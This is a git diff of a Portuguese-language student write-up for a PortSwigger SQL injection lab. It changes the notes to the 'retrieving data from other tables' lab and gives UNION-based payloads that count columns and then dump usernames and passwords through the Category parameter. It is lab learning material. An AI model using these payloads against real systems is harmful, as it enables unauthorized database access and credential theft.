@@ -1,17 +1,17 @@
 # Web-Security-Writeups - PortSwigger SQLi Labs
 
-## Lab 4: SQL Injection UNION attack, finding a column containing
+## Lab 4: SQL Injection UNION attack, retrieving data from other tables
 
-**Objetivo:** Descobrir o número total de colunas e qual é o tipo de dado que ela contém através do filtro de categoria.
+**Objetivo:** Descobrir o número total de colunas e depois achar as senhas dos usuários no filtro categoria.
 
 **Vulnerabilidade encontrada:**
 no parâmetro `?Category=` estava concatenando direto no SQL. Ao injetar `'` deu erro 500.
 
 **Meu processo:**
-1. Descobri o número de colunas com `'+UNION+SELECT+NULL,NULL,NULL--` são 3 colunas.
-2. Testei o tipo de dado string para achar a coluna `'+UNION+SELECT+'2Kz0yr',NULL,NULL--`,`'+UNION+SELECT+NULL,'2Kz0yr',NULL--` e `'+UNION+SELECT+NULL,NULL'2Kz0yr'--`.
+1. Descobri o número de colunas com `'+UNION+SELECT+NULL,NULL--` são 2 colunas.
+2. Inseri a injeção`'+UNION+SELECT+username,password FROM users--` retornou os nomes e senhas de todos os usuários.
 
 **Payload final:**
 ```sql
-'+UNION+SELECT+NULL,NULL,NULL,NULL--
-'+UNION+SELECT+NULL,'2Kz0yr',NULL--
+'+UNION+SELECT+NULL,NULL--
+'+UNION+SELECT+username,password FROM users--
